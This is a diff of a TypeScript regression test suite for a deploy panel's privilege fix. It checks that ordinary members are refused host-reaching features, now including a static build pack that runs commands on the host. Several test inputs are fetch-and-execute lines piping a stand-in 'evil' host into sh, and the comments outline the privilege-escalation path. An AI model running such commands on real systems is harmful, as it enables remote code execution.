@@ -7,7 +7,7 @@ import { asUser, buildTestApp, createFakeDb, svcRow } from './helpers.js';
 /**
  * H-3 regression: `member` is a real privilege boundary.
  *
- * Four deploy-path features gave any authenticated member code execution with
+ * Five deploy-path features gave any authenticated member code execution with
  * the panel's own privileges (Docker socket, and the host itself under the
  * systemd install), while exec / volume files / container files / exec-jobs
  * were all admin-gated on the grounds that host reach is admin-only. These
@@ -17,6 +17,9 @@ import { asUser, buildTestApp, createFakeDb, svcRow } from './helpers.js';
  *   • Compose services        → attacker-authored YAML (host mounts, privileged)
  *   • Lifecycle hooks         → host binaries via engine/pipeline.ts
  *   • docker-socket templates → container control of the whole host
+ *   • static build pack       → `sh -c <installCmd>/<buildCmd>` on the host
+ *                               (engine/builders/staticSite.ts) behind an
+ *                               innocent `type: 'docker'` service
  */
 
 const execMocks = vi.hoisted(() => ({
@@ -64,15 +67,20 @@ beforeEach(() => {
 });
 
 describe('H-3: hostPrivilegeReasons names every host-reaching feature', () => {
-  it('flags pm2, compose, lifecycle hooks and the docker socket', () => {
+  it('flags pm2, compose, lifecycle hooks, the docker socket and the static build pack', () => {
     expect(hostPrivilegeReasons({ type: 'pm2' })).toHaveLength(1);
     expect(hostPrivilegeReasons({ type: 'compose' })).toHaveLength(1);
     expect(hostPrivilegeReasons({ type: 'docker', build: { preDeployCmd: 'curl evil | sh' } })).toHaveLength(1);
     expect(hostPrivilegeReasons({ type: 'docker', dockerSocket: true })).toHaveLength(1);
+    expect(hostPrivilegeReasons({ type: 'docker', build: { buildPack: 'static' } })).toHaveLength(1);
   });
 
   it('leaves a plain container deploy unflagged', () => {
     expect(hostPrivilegeReasons({ type: 'docker', build: { preDeployCmd: null }, dockerSocket: false })).toEqual([]);
+    // Every container-side build pack stays member-accessible.
+    for (const pack of ['auto', 'nixpacks', 'dockerfile', 'railpack']) {
+      expect(hostPrivilegeReasons({ type: 'docker', build: { buildPack: pack } })).toEqual([]);
+    }
   });
 
   it('reports every applicable reason, not just the first', () => {
@@ -114,6 +122,17 @@ describe('H-3: creating a host-privileged service requires admin', () => {
     }
   });
 
+  it('refuses the static build pack for a member', async () => {
+    // The static pack hides behind an innocent `type: 'docker'`: its install
+    // and build commands run on the host via sh -c (staticSite.ts).
+    const res = await create(
+      { ...dockerService, build: { ...dockerService.build, buildPack: 'static', buildCmd: 'curl http://evil | sh' } },
+      member(),
+    );
+    expect(res.statusCode).toBe(403);
+    expect(res.json().error.message).toMatch(/static build pack/);
+  });
+
   it('still allows a member a plain Docker service', async () => {
     const res = await create(dockerService, member());
     expect(res.statusCode).toBe(200);
@@ -125,6 +144,12 @@ describe('H-3: creating a host-privileged service requires admin', () => {
     expect(
       (await create({ ...dockerService, build: { ...dockerService.build, preDeployCmd: 'make migrate' } }, admin()))
         .statusCode,
+    ).toBe(200);
+    expect(
+      (await create(
+        { ...dockerService, build: { ...dockerService.build, buildPack: 'static', buildCmd: 'npm run build' } },
+        admin(),
+      )).statusCode,
     ).toBe(200);
   });
 });
@@ -153,6 +178,22 @@ describe('H-3: a member cannot reach host privilege one PATCH field at a time', 
       method: 'PATCH', url: '/services/1', headers: member(),
       payload: { build: { preDeployCmd: 'curl http://evil | sh' } },
     });
+    expect(res.statusCode).toBe(403);
+  });
+
+  it('refuses switching to the static build pack on its own', async () => {
+    const a = await patchApp({ type: 'docker' }, undefined);
+    const res = await a.inject({
+      method: 'PATCH', url: '/services/1', headers: member(),
+      payload: { build: { buildPack: 'static' } },
+    });
+    expect(res.statusCode).toBe(403);
+    expect(res.json().error.message).toMatch(/static build pack/);
+  });
+
+  it('refuses an unrelated patch when the static pack is ALREADY stored', async () => {
+    const a = await patchApp({ type: 'docker' }, { serviceId: 1, buildPack: 'static', buildCmd: 'npm run build' });
+    const res = await a.inject({ method: 'PATCH', url: '/services/1', headers: member(), payload: { name: 'renamed' } });
     expect(res.statusCode).toBe(403);
   });
 
@@ -191,6 +232,14 @@ describe('H-3: deploying a stored privileged definition requires admin', () => {
 
   it('refuses a member redeploying a service with a stored lifecycle hook', async () => {
     const a = await deployApp({ type: 'docker' }, { serviceId: 1, preDeployCmd: 'make migrate' });
+    const res = await a.inject({ method: 'POST', url: '/services/1/deploys', headers: member() });
+    expect(res.statusCode).toBe(403);
+  });
+
+  it('refuses a member redeploying a stored static-pack service', async () => {
+    // r-next: the pack ran host commands on deploy, so the deploy gate has to
+    // catch definitions that predate the create-time rule.
+    const a = await deployApp({ type: 'docker' }, { serviceId: 1, buildPack: 'static', buildCmd: 'npm run build' });
     const res = await a.inject({ method: 'POST', url: '/services/1/deploys', headers: member() });
     expect(res.statusCode).toBe(403);
   });
